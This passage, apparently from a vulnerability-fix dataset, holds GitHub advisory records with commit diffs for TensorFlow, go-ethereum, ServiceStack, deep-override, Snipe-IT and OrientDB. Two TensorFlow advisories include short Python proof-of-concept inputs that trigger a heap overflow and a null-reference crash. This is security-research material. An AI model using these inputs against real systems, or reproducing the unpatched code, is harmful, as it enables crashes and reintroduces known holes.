'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/6d36ba65577006affb272335b7c1abd829010708\/tensorflow%2Flite%2Fkernels%2Fspace_to_batch_nd.cc', 'patch': '@@ -79,6 +79,7 @@ TfLiteStatus ResizeOutputTensor(TfLiteContext* context,\\n   for (int dim = 0; dim < spatial_dims_num; ++dim) {\\n     int final_dim_size = (input_size->data[dim + 1] + paddings_data[dim * 2] +\\n                           paddings_data[dim * 2 + 1]);\\n+    TF_LITE_ENSURE(context, block_shape[dim] != 0);\\n     TF_LITE_ENSURE_EQ(context, final_dim_size % block_shape[dim], 0);\\n     output_size->data[dim + 1] = final_dim_size \/ block_shape[dim];\\n     output_batch_size *= block_shape[dim];'}}","message_norm":"prevent division by 0\n\npiperorigin-revid: 370984990\nchange-id: ib324955bbeb1cbd97c82fd5d61a00a2697c9a2de","language":"en","entities":"[('prevent', 'ACTION', ''), ('division by 0', 'SECWORD', ''), ('370984990', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/space_to_batch_nd.cc'])","num_files":1.0},{"index":3053,"vuln_id":"GHSA-v592-xf75-856p","cwe_id":"{'CWE-682'}","score":5.3,"chain":"{'https:\/\/github.com\/ethereum\/go-ethereum\/commit\/d990df909d7839640143344e79356754384dcdd0'}","dataset":"osv","summary":"Erroneous Proof of Work calculation in geth ### Impact\nAn ethash mining DAG generation flaw in Geth could cause miners to erroneously calculate PoW in an upcoming epoch (estimated early January, 2021). This happened on the ETC chain on 2020-11-06. This issue is relevant only for miners, non-mining nodes are unaffected.\n\n### Patches\nThis issue is also fixed as of 1.9.24. Thanks to @slavikus for bringing the issue to our attention and writing the fix. \n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [go-ethereum](https:\/\/github.com\/ethereum\/go-ethereum)\n* Email us at [security@ethereum.org](mailto:security@ethereum.org)","published_date":"2021-06-29","chain_len":1,"project":"https:\/\/github.com\/ethereum\/go-ethereum","commit_href":"https:\/\/github.com\/ethereum\/go-ethereum\/commit\/d990df909d7839640143344e79356754384dcdd0","commit_sha":"d990df909d7839640143344e79356754384dcdd0","patch":"SINGLE","chain_ord":"['d990df909d7839640143344e79356754384dcdd0']","before_first_fix_commit":"{'27d93c1848846b75d0e67fcac284a0d417acd47c'}","last_fix_commit":"d990df909d7839640143344e79356754384dcdd0","chain_ord_pos":1.0,"commit_datetime":"11\/11\/2020, 20:13:12","message":"consensus\/ethash: use 64bit indexes for the DAG generation (#21793)\n\n* Bit boundary fix for the DAG generation routine\r\n\r\n* Fix unnecessary conversion warnings\r\n\r\nCo-authored-by: Sergey Pavlov <spavlov@gmail.com>","author":"Slava Karpenko","comments":null,"stats":"{'additions': 5, 'deletions': 5, 'total': 10}","files":"{'consensus\/ethash\/algorithm.go': {'additions': 5, 'deletions': 5, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ethereum\/go-ethereum\/raw\/d990df909d7839640143344e79356754384dcdd0\/consensus%2Fethash%2Falgorithm.go', 'patch': '@@ -304,16 +304,16 @@ func generateDataset(dest []uint32, epoch uint64, cache []uint32) {\\n \\t\\t\\tkeccak512 := makeHasher(sha3.NewLegacyKeccak512())\\n \\n \\t\\t\\t\/\/ Calculate the data segment this thread should generate\\n-\\t\\t\\tbatch := uint32((size + hashBytes*uint64(threads) - 1) \/ (hashBytes * uint64(threads)))\\n-\\t\\t\\tfirst := uint32(id) * batch\\n+\\t\\t\\tbatch := (size + hashBytes*uint64(threads) - 1) \/ (hashBytes * uint64(threads))\\n+\\t\\t\\tfirst := uint64(id) * batch\\n \\t\\t\\tlimit := first + batch\\n-\\t\\t\\tif limit > uint32(size\/hashBytes) {\\n-\\t\\t\\t\\tlimit = uint32(size \/ hashBytes)\\n+\\t\\t\\tif limit > size\/hashBytes {\\n+\\t\\t\\t\\tlimit = size \/ hashBytes\\n \\t\\t\\t}\\n \\t\\t\\t\/\/ Calculate the dataset segment\\n \\t\\t\\tpercent := size \/ hashBytes \/ 100\\n \\t\\t\\tfor index := first; index < limit; index++ {\\n-\\t\\t\\t\\titem := generateDatasetItem(cache, index, keccak512)\\n+\\t\\t\\t\\titem := generateDatasetItem(cache, uint32(index), keccak512)\\n \\t\\t\\t\\tif swapped {\\n \\t\\t\\t\\t\\tswap(item)\\n \\t\\t\\t\\t}'}}","message_norm":"consensus\/ethash: use 64bit indexes for the dag generation (#21793)\n\n* bit boundary fix for the dag generation routine\r\n\r\n* fix unnecessary conversion warnings\r\n\r\nco-authored-by: sergey pavlov <spavlov@gmail.com>","language":"en","entities":"[('#21793', 'ISSUE', ''), ('fix', 'ACTION', ''), ('warnings', 'FLAW', ''), ('spavlov@gmail.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['consensus\/ethash\/algorithm.go'])","num_files":1.0},{"index":3055,"vuln_id":"GHSA-v5rv-hpxg-8x49","cwe_id":"{'CWE-347'}","score":0.0,"chain":"{'https:\/\/github.com\/ServiceStack\/ServiceStack\/commit\/540d4060e877a03ae95343c1a8560a26768585ee'}","dataset":"osv","summary":"Signature validation bypass in ServiceStack ServiceStack before 5.9.2 mishandles JWT signature verification unless an application has a custom ValidateToken function that establishes a valid minimum length for a signature.","published_date":"2021-01-13","chain_len":1,"project":"https:\/\/github.com\/ServiceStack\/ServiceStack","commit_href":"https:\/\/github.com\/ServiceStack\/ServiceStack\/commit\/540d4060e877a03ae95343c1a8560a26768585ee","commit_sha":"540d4060e877a03ae95343c1a8560a26768585ee","patch":"SINGLE","chain_ord":"['540d4060e877a03ae95343c1a8560a26768585ee']","before_first_fix_commit":"{'794f1363f51f81fbead1dc8eb4dbc5076b2236a3'}","last_fix_commit":"540d4060e877a03ae95343c1a8560a26768585ee","chain_ord_pos":1.0,"commit_datetime":"08\/04\/2020, 06:16:17","message":"Update EquivalentTo to test length & null for equality as well","author":"Demis Bellot","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'src\/ServiceStack.Common\/EnumerableExtensions.cs': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ServiceStack\/ServiceStack\/raw\/540d4060e877a03ae95343c1a8560a26768585ee\/src%2FServiceStack.Common%2FEnumerableExtensions.cs', 'patch': '@@ -234,6 +234,12 @@ public static T FirstNonDefault<T>(this IEnumerable<T> values)\\n         [MethodImpl(MethodImplOptions.AggressiveInlining)]\\n         public static bool EquivalentTo(this byte[] bytes, byte[] other)\\n         {\\n+            if (bytes == null || other == null)\\n+                return bytes == other;\\n+\\n+            if (bytes.Length != other.Length)\\n+                return false;\\n+\\n             var compare = 0;\\n             for (var i = 0; i < other.Length; i++)\\n                 compare |= other[i] ^ bytes[i];'}}","message_norm":"update equivalentto to test length & null for equality as well","language":"en","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/ServiceStack.Common\/EnumerableExtensions.cs'])","num_files":1.0},{"index":3059,"vuln_id":"GHSA-v659-54cx-g4qr","cwe_id":"{'CWE-1321'}","score":9.8,"chain":"{'https:\/\/github.com\/ASaiAnudeep\/deep-override\/commit\/2aced17651fb684959a6e04b1465a8329b3d5268'}","dataset":"osv","summary":"Prototype Pollution in deep-override Prototype pollution vulnerability in 'deep-override' versions 1.0.0 through 1.0.1 allows an attacker to cause a denial of service and may lead to remote code execution.","published_date":"2021-05-17","chain_len":1,"project":"https:\/\/github.com\/ASaiAnudeep\/deep-override","commit_href":"https:\/\/github.com\/ASaiAnudeep\/deep-override\/commit\/2aced17651fb684959a6e04b1465a8329b3d5268","commit_sha":"2aced17651fb684959a6e04b1465a8329b3d5268","patch":"SINGLE","chain_ord":"['2aced17651fb684959a6e04b1465a8329b3d5268']","before_first_fix_commit":"{'393135641fb0891409ac2a53783c553a7ed749a9'}","last_fix_commit":"2aced17651fb684959a6e04b1465a8329b3d5268","chain_ord_pos":1.0,"commit_datetime":"12\/17\/2020, 17:01:18","message":"Security fix for Prototype Pollution","author":"Arjun Shibu","comments":null,"stats":"{'additions': 3, 'deletions': 1, 'total': 4}","files":"{'src\/index.js': {'additions': 3, 'deletions': 1, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ASaiAnudeep\/deep-override\/raw\/2aced17651fb684959a6e04b1465a8329b3d5268\/src%2Findex.js', 'patch': \"@@ -46,6 +46,8 @@ function override(...rawArgs) {\\n       });\\n     } else {\\n       Object.keys(obj).forEach(key => {\\n+        if (key == '__proto__' || key == 'constructor' || key == 'prototype')\\n+          return\\n         src = target[key];\\n         val = obj[key];\\n         if (val === target) {\\n@@ -69,4 +71,4 @@ function override(...rawArgs) {\\n   return target;\\n }\\n \\n-module.exports = override;\\n\\\\ No newline at end of file\\n+module.exports = override;\"}}","message_norm":"security fix for prototype pollution","language":"en","entities":"[('security', 'SECWORD', ''), ('prototype pollution', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/index.js'])","num_files":1.0},{"index":3062,"vuln_id":"GHSA-v6r6-84gr-92rm","cwe_id":"{'CWE-787', 'CWE-119'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6fc9141f42f6a72180ecd24021c3e6b36165fe0d'}","dataset":"osv","summary":"Heap buffer overflow in `AvgPool3DGrad` ### Impact\nThe implementation of `tf.raw_ops.AvgPool3DGrad` is vulnerable to a heap buffer overflow:\n\n```python\nimport tensorflow as tf\n\norig_input_shape = tf.constant([10, 6, 3, 7, 7], shape=[5], dtype=tf.int32)\ngrad = tf.constant([0.01, 0, 0], shape=[3, 1, 1, 1, 1], dtype=tf.float32)\nksize = [1, 1, 1, 1, 1]\nstrides = [1, 1, 1, 1, 1]\npadding = \"SAME\"\n\ntf.raw_ops.AvgPool3DGrad(\n  orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides,\n  padding=padding)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/d80ffba9702dc19d1fac74fc4b766b3fa1ee976b\/tensorflow\/core\/kernels\/pooling_ops_3d.cc#L376-L450) assumes that the `orig_input_shape` and `grad` tensors have similar first and last dimensions but does not check that this assumption is validated.\n\n### Patches\nWe have patched the issue in GitHub commit [6fc9141f42f6a72180ecd24021c3e6b36165fe0d](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6fc9141f42f6a72180ecd24021c3e6b36165fe0d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6fc9141f42f6a72180ecd24021c3e6b36165fe0d","commit_sha":"6fc9141f42f6a72180ecd24021c3e6b36165fe0d","patch":"SINGLE","chain_ord":"['6fc9141f42f6a72180ecd24021c3e6b36165fe0d']","before_first_fix_commit":"{'d80ffba9702dc19d1fac74fc4b766b3fa1ee976b'}","last_fix_commit":"6fc9141f42f6a72180ecd24021c3e6b36165fe0d","chain_ord_pos":1.0,"commit_datetime":"05\/06\/2021, 16:51:26","message":"Fix assertion failure in pooling_ops_3d\n\nPiperOrigin-RevId: 372364504\nChange-Id: Iecde4fe26b47a8fa935d6e2611b5585ed5777781","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 13, 'deletions': 0, 'total': 13}","files":"{'tensorflow\/core\/kernels\/pooling_ops_3d.cc': {'additions': 13, 'deletions': 0, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/6fc9141f42f6a72180ecd24021c3e6b36165fe0d\/tensorflow%2Fcore%2Fkernels%2Fpooling_ops_3d.cc', 'patch': '@@ -383,6 +383,19 @@ struct LaunchAvgPooling3dGradOp<CPUDevice, T> {\\n                      const std::array<int64, 3>& output_shape,\\n                      const std::array<int64, 3>& padding,\\n                      TensorFormat data_format, Tensor* output) {\\n+    OP_REQUIRES(\\n+        context, tensor_in_shape.dim_size(0) == out_backprop.dim_size(0),\\n+        errors::InvalidArgument(\\n+            \"Expected first dimension of tensor_in_shape and \"\\n+            \"out_backprop to match, got \",\\n+            tensor_in_shape.dim_size(0), \" and \", out_backprop.dim_size(0)));\\n+    OP_REQUIRES(\\n+        context, tensor_in_shape.dim_size(4) == out_backprop.dim_size(4),\\n+        errors::InvalidArgument(\\n+            \"Expected last dimension of tensor_in_shape and \"\\n+            \"out_backprop to match, got \",\\n+            tensor_in_shape.dim_size(4), \" and \", out_backprop.dim_size(4)));\\n+\\n     output->flat<T>().setZero();\\n     std::array<int64, 3> input_size = {{tensor_in_shape.dim_size(3),\\n                                         tensor_in_shape.dim_size(2),'}}","message_norm":"fix assertion failure in pooling_ops_3d\n\npiperorigin-revid: 372364504\nchange-id: iecde4fe26b47a8fa935d6e2611b5585ed5777781","language":"en","entities":"[('fix', 'ACTION', ''), ('372364504', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/pooling_ops_3d.cc'])","num_files":1.0},{"index":3064,"vuln_id":"GHSA-v6vg-pxvv-g5cq","cwe_id":"{'CWE-269'}","score":6.5,"chain":"{'https:\/\/github.com\/snipe\/snipe-it\/commit\/db0c0e790892db874573d95f8ae4268b8a011ab1'}","dataset":"osv","summary":"Improper Privilege Management in Snipe-IT Snipe-IT prior to 5.3.9 is vulnerable to improper privilege management. A user who does not have access to the supplier module may view supplier content.","published_date":"2022-02-15","chain_len":1,"project":"https:\/\/github.com\/snipe\/snipe-it","commit_href":"https:\/\/github.com\/snipe\/snipe-it\/commit\/db0c0e790892db874573d95f8ae4268b8a011ab1","commit_sha":"db0c0e790892db874573d95f8ae4268b8a011ab1","patch":"SINGLE","chain_ord":"['db0c0e790892db874573d95f8ae4268b8a011ab1']","before_first_fix_commit":"{'05c0819776b07425b2831cd31a8a0f4e7ac30c09', 'd77a47765ea1fd112a9b0731a88de1e26ed24256'}","last_fix_commit":"db0c0e790892db874573d95f8ae4268b8a011ab1","chain_ord_pos":1.0,"commit_datetime":"02\/13\/2022, 18:56:55","message":"Merge pull request #10665 from snipe\/fixes\/adds_gate_to_supplier_view\n\nAdds gate to supplier","author":"snipe","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'app\/Http\/Controllers\/SuppliersController.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/snipe\/snipe-it\/raw\/db0c0e790892db874573d95f8ae4268b8a011ab1\/app%2FHttp%2FControllers%2FSuppliersController.php', 'patch': \"@@ -184,6 +184,7 @@ public function destroy($supplierId)\\n      *\/\\n     public function show($supplierId = null)\\n     {\\n+        $this->authorize('view', Supplier::class);\\n         $supplier = Supplier::find($supplierId);\\n \\n         if (isset($supplier->id)) {\"}}","message_norm":"merge pull request #10665 from snipe\/fixes\/adds_gate_to_supplier_view\n\nadds gate to supplier","language":"en","entities":"[('#10665', 'ISSUE', ''), ('adds_gate_to_supplier_view', 'ACTION', ''), ('adds', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Http\/Controllers\/SuppliersController.php'])","num_files":1.0},{"index":3067,"vuln_id":"GHSA-v6wr-fch2-vm5w","cwe_id":"{'CWE-200'}","score":5.9,"chain":"{'https:\/\/github.com\/orientechnologies\/orientdb\/commit\/668ece96be210e742a4e2820a3085b215cf55104'}","dataset":"osv","summary":"Moderate severity vulnerability that affects com.orientechnologies:orientdb-studio server\/network\/protocol\/http\/OHttpSessionManager.java in the Studio component in OrientDB Server Community Edition before 2.0.15 and 2.1.x before 2.1.1 improperly relies on the java.util.Random class for generation of random Session ID values, which makes it easier for remote attackers to predict a value by determining the internal state of the PRNG in this class.","published_date":"2018-10-18","chain_len":1,"project":"https:\/\/github.com\/orientechnologies\/orientdb","commit_href":"https:\/\/github.com\/orientechnologies\/orientdb\/commit\/668ece96be210e742a4e2820a3085b215cf55104","commit_sha":"668ece96be210e742a4e2820a3085b215cf55104","patch":"SINGLE","chain_ord":"['668ece96be210e742a4e2820a3085b215cf55104']","before_first_fix_commit":"{'41fd20ab022e22bce32d62372dbe279693322086'}","last_fix_commit":"668ece96be210e742a4e2820a3085b215cf55104","chain_ord_pos":1.0,"commit_datetime":"04\/04\/2015, 14:45:12","message":"Adopted SecureRandom to avoid predicable random numbers in session","author":"lvca","comments":null,"stats":"{'additions': 136, 'deletions': 135, 'total': 271}","files":"{'server\/src\/main\/java\/com\/orientechnologies\/orient\/server\/network\/protocol\/http\/OHttpSessionManager.java': {'additions': 136, 'deletions': 135, 'changes': 271, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/orientechnologies\/orientdb\/raw\/668ece96be210e742a4e2820a3085b215cf55104\/server%2Fsrc%2Fmain%2Fjava%2Fcom%2Forientechnologies%2Forient%2Fserver%2Fnetwork%2Fprotocol%2Fhttp%2FOHttpSessionManager.java', 'patch': '@@ -1,141 +1,142 @@\\n \/*\\r\\n-    *\\r\\n-    *  *  Copyright 2014 Orient Technologies LTD (info(at)orientechnologies.com)\\r\\n-    *  *\\r\\n-    *  *  Licensed under the Apache License, Version 2.0 (the \"License\");\\r\\n-    *  *  you may not use this file except in compliance with the License.\\r\\n-    *  *  You may obtain a copy of the License at\\r\\n-    *  *\\r\\n-    *  *       http:\/\/www.apache.org\/licenses\/LICENSE-2.0\\r\\n-    *  *\\r\\n-    *  *  Unless required by applicable law or agreed to in writing, software\\r\\n-    *  *  distributed under the License is distributed on an \"AS IS\" BASIS,\\r\\n-    *  *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\\r\\n-    *  *  See the License for the specific language governing permissions and\\r\\n-    *  *  limitations under the License.\\r\\n-    *  *\\r\\n-    *  * For more information: http:\/\/www.orientechnologies.com\\r\\n-    *\\r\\n-    *\/\\r\\n+ *\\r\\n+ *  *  Copyright 2014 Orient Technologies LTD (info(at)orientechnologies.com)\\r\\n+ *  *\\r\\n+ *  *  Licensed under the Apache License, Version 2.0 (the \"License\");\\r\\n+ *  *  you may not use this file except in compliance with the License.\\r\\n+ *  *  You may obtain a copy of the License at\\r\\n+ *  *\\r\\n+ *  *       http:\/\/www.apache.org\/licenses\/LICENSE-2.0\\r\\n+ *  *\\r\\n+ *  *  Unless required by applicable law or agreed to in writing, software\\r\\n+ *  *  distributed under the License is distributed on an \"AS IS\" BASIS,\\r\\n+ *  *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\\r\\n+ *  *  See the License for the specific language governing permissions and\\r\\n+ *  *  limitations under the License.\\r\\n+ *  *\\r\\n+ *  * For more information: http:\/\/www.orientechnologies.com\\r\\n+ *\\r\\n+ *\/\\r\\n package com.orientechnologies.orient.server.network.protocol.http;\\r\\n \\r\\n import com.orientechnologies.common.concur.resource.OSharedResourceAbstract;\\r\\n- import com.orientechnologies.common.log.OLogManager;\\r\\n- import com.orientechnologies.orient.core.Orient;\\r\\n- import com.orientechnologies.orient.core.config.OGlobalConfiguration;\\r\\n-\\r\\n- import java.util.HashMap;\\r\\n- import java.util.Iterator;\\r\\n- import java.util.Map;\\r\\n- import java.util.Map.Entry;\\r\\n- import java.util.Random;\\r\\n- import java.util.TimerTask;\\r\\n+import com.orientechnologies.common.log.OLogManager;\\r\\n+import com.orientechnologies.orient.core.Orient;\\r\\n+import com.orientechnologies.orient.core.config.OGlobalConfiguration;\\r\\n+\\r\\n+import java.security.SecureRandom;\\r\\n+import java.util.HashMap;\\r\\n+import java.util.Iterator;\\r\\n+import java.util.Map;\\r\\n+import java.util.Map.Entry;\\r\\n+import java.util.Random;\\r\\n+import java.util.TimerTask;\\r\\n \\r\\n \/**\\r\\n-  * Handles the HTTP sessions such as a real HTTP Server.\\r\\n-  *\\r\\n-  * @author Luca Garulli\\r\\n-  *\/\\r\\n- public class OHttpSessionManager extends OSharedResourceAbstract {\\r\\n-   private static final OHttpSessionManager instance = new OHttpSessionManager();\\r\\n-   private Map<String, OHttpSession>        sessions = new HashMap<String, OHttpSession>();\\r\\n-   private int                              expirationTime;\\r\\n-   private Random                           random   = new Random();\\r\\n-\\r\\n-   protected OHttpSessionManager() {\\r\\n-     expirationTime = OGlobalConfiguration.NETWORK_HTTP_SESSION_EXPIRE_TIMEOUT.getValueAsInteger() * 1000;\\r\\n-\\r\\n-     Orient.instance().scheduleTask(new TimerTask() {\\r\\n-       @Override\\r\\n-       public void run() {\\r\\n-         final int expired = checkSessionsValidity();\\r\\n-         if (expired > 0)\\r\\n-           OLogManager.instance().debug(this, \"Removed %d session because expired\", expired);\\r\\n-       }\\r\\n-     }, expirationTime, expirationTime);\\r\\n-   }\\r\\n-\\r\\n-   public int checkSessionsValidity() {\\r\\n-     int expired = 0;\\r\\n-\\r\\n-     acquireExclusiveLock();\\r\\n-     try {\\r\\n-       final long now = System.currentTimeMillis();\\r\\n-\\r\\n-       Entry<String, OHttpSession> s;\\r\\n-       for (Iterator<Map.Entry<String, OHttpSession>> it = sessions.entrySet().iterator(); it.hasNext();) {\\r\\n-         s = it.next();\\r\\n-\\r\\n-         if (now - s.getValue().getUpdatedOn() > expirationTime) {\\r\\n-           \/\/ REMOVE THE SESSION\\r\\n-           it.remove();\\r\\n-           expired++;\\r\\n-         }\\r\\n-       }\\r\\n-\\r\\n-     } finally {\\r\\n-       releaseExclusiveLock();\\r\\n-     }\\r\\n-\\r\\n-     return expired;\\r\\n-   }\\r\\n-\\r\\n-   public OHttpSession[] getSessions() {\\r\\n-     acquireSharedLock();\\r\\n-     try {\\r\\n-\\r\\n-       return (OHttpSession[]) sessions.values().toArray(new OHttpSession[sessions.size()]);\\r\\n-\\r\\n-     } finally {\\r\\n-       releaseSharedLock();\\r\\n-     }\\r\\n-   }\\r\\n-\\r\\n-   public OHttpSession getSession(final String iId) {\\r\\n-     acquireSharedLock();\\r\\n-     try {\\r\\n-\\r\\n-       final OHttpSession sess = sessions.get(iId);\\r\\n-       if (sess != null)\\r\\n-         sess.updateLastUpdatedOn();\\r\\n-       return sess;\\r\\n-\\r\\n-     } finally {\\r\\n-       releaseSharedLock();\\r\\n-     }\\r\\n-   }\\r\\n-\\r\\n-   public String createSession(final String iDatabaseName, final String iUserName, final String iUserPassword) {\\r\\n-     acquireExclusiveLock();\\r\\n-     try {\\r\\n-       final String id = \"OS\" + System.currentTimeMillis() + random.nextLong();\\r\\n-       sessions.put(id, new OHttpSession(id, iDatabaseName, iUserName, iUserPassword));\\r\\n-       return id;\\r\\n-\\r\\n-     } finally {\\r\\n-       releaseExclusiveLock();\\r\\n-     }\\r\\n-   }\\r\\n-\\r\\n-   public OHttpSession removeSession(final String iSessionId) {\\r\\n-     acquireExclusiveLock();\\r\\n-     try {\\r\\n-       return sessions.remove(iSessionId);\\r\\n-\\r\\n-     } finally {\\r\\n-       releaseExclusiveLock();\\r\\n-     }\\r\\n-   }\\r\\n-\\r\\n-   public int getExpirationTime() {\\r\\n-     return expirationTime;\\r\\n-   }\\r\\n-\\r\\n-   public void setExpirationTime(int expirationTime) {\\r\\n-     this.expirationTime = expirationTime;\\r\\n-   }\\r\\n-\\r\\n-   public static OHttpSessionManager getInstance() {\\r\\n-     return instance;\\r\\n-   }\\r\\n- }\\r\\n+ * Handles the HTTP sessions such as a real HTTP Server.\\r\\n+ *\\r\\n+ * @author Luca Garulli\\r\\n+ *\/\\r\\n+public class OHttpSessionManager extends OSharedResourceAbstract {\\r\\n+  private static final OHttpSessionManager instance = new OHttpSessionManager();\\r\\n+  private Map<String, OHttpSession>        sessions = new HashMap<String, OHttpSession>();\\r\\n+  private int                              expirationTime;\\r\\n+  private Random                           random   = new SecureRandom();\\r\\n+\\r\\n+  protected OHttpSessionManager() {\\r\\n+    expirationTime = OGlobalConfiguration.NETWORK_HTTP_SESSION_EXPIRE_TIMEOUT.getValueAsInteger() * 1000;\\r\\n+\\r\\n+    Orient.instance().scheduleTask(new TimerTask() {\\r\\n+      @Override\\r\\n+      public void run() {\\r\\n+        final int expired = checkSessionsValidity();\\r\\n+        if (expired > 0)\\r\\n+          OLogManager.instance().debug(this, \"Removed %d session because expired\", expired);\\r\\n+      }\\r\\n+    }, expirationTime, expirationTime);\\r\\n+  }\\r\\n+\\r\\n+  public int checkSessionsValidity() {\\r\\n+    int expired = 0;\\r\\n+\\r\\n+    acquireExclusiveLock();\\r\\n+    try {\\r\\n+      final long now = System.currentTimeMillis();\\r\\n+\\r\\n+      Entry<String, OHttpSession> s;\\r\\n+      for (Iterator<Map.Entry<String, OHttpSession>> it = sessions.entrySet().iterator(); it.hasNext();) {\\r\\n+        s = it.next();\\r\\n+\\r\\n+        if (now - s.getValue().getUpdatedOn() > expirationTime) {\\r\\n+          \/\/ REMOVE THE SESSION\\r\\n+          it.remove();\\r\\n+          expired++;\\r\\n+        }\\r\\n+      }\\r\\n+\\r\\n+    } finally {\\r\\n+      releaseExclusiveLock();\\r\\n+    }\\r\\n+\\r\\n+    return expired;\\r\\n+  }\\r\\n+\\r\\n+  public OHttpSession[] getSessions() {\\r\\n+    acquireSharedLock();\\r\\n+    try {\\r\\n+\\r\\n+      return (OHttpSession[]) sessions.values().toArray(new OHttpSession[sessions.size()]);\\r\\n+\\r\\n+    } finally {\\r\\n+      releaseSharedLock();\\r\\n+    }\\r\\n+  }\\r\\n+\\r\\n+  public OHttpSession getSession(final String iId) {\\r\\n+    acquireSharedLock();\\r\\n+    try {\\r\\n+\\r\\n+      final OHttpSession sess = sessions.get(iId);\\r\\n+      if (sess != null)\\r\\n+        sess.updateLastUpdatedOn();\\r\\n+      return sess;\\r\\n+\\r\\n+    } finally {\\r\\n+      releaseSharedLock();\\r\\n+    }\\r\\n+  }\\r\\n+\\r\\n+  public String createSession(final String iDatabaseName, final String iUserName, final String iUserPassword) {\\r\\n+    acquireExclusiveLock();\\r\\n+    try {\\r\\n+      final String id = \"OS\" + System.currentTimeMillis() + random.nextLong();\\r\\n+      sessions.put(id, new OHttpSession(id, iDatabaseName, iUserName, iUserPassword));\\r\\n+      return id;\\r\\n+\\r\\n+    } finally {\\r\\n+      releaseExclusiveLock();\\r\\n+    }\\r\\n+  }\\r\\n+\\r\\n+  public OHttpSession removeSession(final String iSessionId) {\\r\\n+    acquireExclusiveLock();\\r\\n+    try {\\r\\n+      return sessions.remove(iSessionId);\\r\\n+\\r\\n+    } finally {\\r\\n+      releaseExclusiveLock();\\r\\n+    }\\r\\n+  }\\r\\n+\\r\\n+  public int getExpirationTime() {\\r\\n+    return expirationTime;\\r\\n+  }\\r\\n+\\r\\n+  public void setExpirationTime(int expirationTime) {\\r\\n+    this.expirationTime = expirationTime;\\r\\n+  }\\r\\n+\\r\\n+  public static OHttpSessionManager getInstance() {\\r\\n+    return instance;\\r\\n+  }\\r\\n+}'}}","message_norm":"adopted securerandom to avoid predicable random numbers in session","language":"en","entities":"[('securerandom', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/src\/main\/java\/com\/orientechnologies\/orient\/server\/network\/protocol\/http\/OHttpSessionManager.java'])","num_files":1.0},{"index":3069,"vuln_id":"GHSA-v768-w7m9-2vmm","cwe_id":"{'CWE-824'}","score":7.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/578e634b4f1c1c684d4b4294f9e5281b2133b3ed'}","dataset":"osv","summary":"Reference binding to nullptr in shape inference ### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.SparseFillEmptyRows`:\n\n```python\nimport tensorflow as tf\n  \ntf.compat.v1.disable_v2_behavior()\ntf.raw_ops.SparseFillEmptyRows(\n  indices = tf.constant([], shape=[0, 0], dtype=tf.int64),\n  values = tf.constant([], shape=[0], dtype=tf.int64),\n  dense_shape = tf.constant([], shape=[0], dtype=tf.int64),\n  default_value = 0)\n```\n  \nThe shape inference [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/core\/ops\/sparse_ops.cc#L608-L634) does not validate that the input arguments are not empty tensors.\n\n### Patches \nWe have patched the issue in GitHub commit [578e634b4f1c1c684d4b4294f9e5281b2133b3ed](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/578e634b4f1c1c684d4b4294f9e5281b2133b3ed).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu 